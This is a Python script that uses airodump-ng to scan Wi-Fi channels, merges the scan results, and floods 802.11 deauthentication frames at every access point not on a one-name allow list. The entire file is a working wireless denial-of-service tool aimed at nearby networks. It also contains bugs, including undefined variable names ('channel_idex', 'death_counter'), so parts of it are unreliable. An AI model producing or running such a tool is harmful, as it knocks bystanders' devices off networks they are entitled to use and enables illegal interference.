import logging
import csv
import time
import subprocess
import os
import shutil

from threading import Thread, Lock
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

deauth_counter = 0
csv_lock = Lock()

def deauth(t_mac, bssid, iface, ch, count=1):
    global deauth_counter
    subprocess.run(["iw", "dev", iface, "set", "channel", str(ch)])
    
    frame = RadioTap() / Dot11(addr1=t_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=1)
    
    print(f"\nSending packet to {t_mac} on channel {ch}")

    sendp(frame, iface=iface, count=count, inter=0.1, verbose=True)
    
    deauth_counter += count

def check_csv(csv_path, allowed_APs):
    with csv_lock:
        try:
            with open(csv_path, 'r') as csvfile:
                csv_reader = csv.reader(csvfile)
                headers = next(csv_reader)

                bssid_index = next((i for i, header in enumerate(headers) if 'BSSID' in header), None)
                essid_index = next((i for i, header in enumerate(headers) if 'ESSID' in header), None)
                channel_index = next((i for i, header in enumerate(headers) if 'channel' in header), None)

                if bssid_index is None or essid_index is None or channel_idex is None:
                    print("Columns not found in the CSV file.")
                    return death_counter

                for r in csv_reader:
                    try:
                        t_mac = r[bssid_index].strip()
                        bssid = r[bssid_index].strip()
                        essid = r[essid_index].strip()
                        
                        if essid not in allowed_APs:
                            deauth(t_mac=t_mac, bssid=bssid, iface="wlan1", ch=int(r[channel_index]), count=5)
                            print(f"BSSID FOUND: {t_mac}, ESSID FOUND: {essid}")
                    except IndexError as e:
                        print(f"IndexError: {e}, Row: {r}")
        except Exception as e:
            print(f"Error reading CSV: {e}")
    
    return deauth_counter


def count_files():
    cwd = os.getcwd()

    print(f"Current directory: {cwd}")

    files = os.listdir(cwd)
    
    print(f"Files in directory: {files}")

    file_count = sum(1 for file in files if file.startswith("output-") and file.endswith(".csv"))
    
    print(f"Found {file_count} CSV files")

    return file_count

def run_airodump(duration, ch, allowed_APs):

    process = subprocess.Popen(["airodump-ng", "--output-format", "csv", "--write", "output", "--channel", str(ch), "--write-interval", "1", "wlan1"])

    time.sleep(duration)

    process.terminate()

    fc = count_files()

    print(f"Found {fc} CSV files to merge")
    
    with open("merged-scan.csv", "wb") as merged_scan:
        for i in range(1, fc + 1):
            with open(f"output-{i:02d}.csv", "rb") as current_file:
                shutil.copyfileobj(current_file, merged_scan)
    
    print("Merged successfully")

    check_csv(csv_path="merged-scan.csv", allowed_APs=allowed_APs)
    
    print(f"Total deauth packets sent: {deauth_counter}")

def threading_func(ch_list, allowed_APs, duration):
    global deauth_counter

    threads = []
    for ch in ch_list:
        thread = Thread(target=run_airodump, args=(duration, ch, allowed_APs))
        threads.append(thread)
        thread.start()
    	
    for thread in threads:
    	thread.join()
    	    
    
t = 10
allowed_APs = ["Wapiti2000"] # add Wapiti3004, WapitiWifi, Wapiti77 back
#ch_list = list(range(1,15)) + [36,40,44,48,52,56,60,64,100,104,108,112,116,132,136,140,144,149,153,157,161,165]
ch_list = [1,6,11,36,40,44,48,149,153,157,161]
threading_func(ch_list=ch_list, allowed_APs=allowed_APs, duration=t)
